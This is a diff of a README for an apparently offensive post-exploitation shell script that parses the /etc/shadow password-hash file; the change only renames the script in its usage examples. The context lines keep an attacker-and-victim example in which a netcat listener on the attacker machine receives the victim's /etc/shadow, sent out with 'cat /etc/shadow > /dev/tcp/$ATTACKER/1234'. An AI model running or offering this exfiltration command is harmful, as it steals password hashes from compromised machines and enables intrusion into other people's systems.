@@ -8,17 +8,17 @@ This script aims to make post exploitation easier by parsing the `/etc/shadow` f
 
 Currently, the script only supports reading from stdin:
 ```sh
-cat /etc/shadow | ./etcshash.sh
+cat /etc/shadow | ./etcsha.sh
 ```
 or output every field of the `/etc/shadow` file with the `-a` flag
 ```sh
-cat /etc/shadow | ./etcshash.sh -a
+cat /etc/shadow | ./etcsha.sh -a
 ```
 
 as it reads from stdin it can also receive files sent e.g. from netcat:
 ```sh
 # attacker machine:
-nc -lvnp 1234 | ./etcshash.sh
+nc -lvnp 1234 | ./etcsha.sh
 
 # victim:
 cat /etc/shadow > /dev/tcp/$ATTACKER/1234
